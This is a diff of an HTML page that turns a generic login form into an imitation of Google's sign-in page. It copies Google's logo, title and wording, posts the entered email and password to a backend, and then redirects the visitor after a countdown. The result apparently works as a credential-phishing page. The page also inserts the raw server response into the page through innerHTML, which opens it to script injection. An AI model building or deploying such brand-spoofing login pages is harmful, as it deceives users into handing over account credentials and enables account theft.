@@ -2,22 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Login Example</title>
+    <title>Sign in Google</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="favicon.ico">
 </head>
 <body>
-    <h1>Login</h1>
-    <form id="loginForm">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-        <br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <br>
-        <button type="submit">Login</button>
-    </form>
-    <div id="result"></div>
+    <div class="google-login-container">
+        <div class="google-login-card" id="loginCard">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+            <h2 class="google-signin-title">Sign in</h2>
+            <p class="google-signin-subtitle">to continue to Search</p>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" required autocomplete="username" autofocus>
+                    <label for="username">Email or phone</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                    <label for="password">Enter your password</label>
+                </div>
+                <div class="actions">
+                    <a href="#" class="forgot-link">Forgot email?</a>
+                </div>
+                <button type="submit" class="google-signin-btn">Next</button>
+            </form>
+            <div id="result"></div>
+            <div class="google-footer">
+                <a href="#" class="create-account-link">Create account</a>
+            </div>
+        </div>
+    </div>
     <script>
+        // Show the card with transition
+        window.onload = function() {
+            document.getElementById('loginCard').classList.add('show');
+        };
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
@@ -34,7 +53,20 @@
                     })
                 });
                 const data = await response.text();
-                document.getElementById('result').innerHTML = data;
+                let seconds = 5;
+                document.getElementById('result').innerHTML = data + `<br>Redirecting in <span id="countdown">${seconds}</span> seconds...`;
+                // Wait for DOM to update before getting countdownSpan
+                setTimeout(function() {
+                    const countdownSpan = document.getElementById('countdown');
+                    const interval = setInterval(function() {
+                        seconds--;
+                        countdownSpan.textContent = seconds;
+                        if (seconds <= 0) {
+                            clearInterval(interval);
+                            window.location.href = "redirect.html";
+                        }
+                    }, 1000);
+                }, 0);
             } catch (error) {
                 document.getElementById('result').innerHTML = 'Error: ' + error;
             }
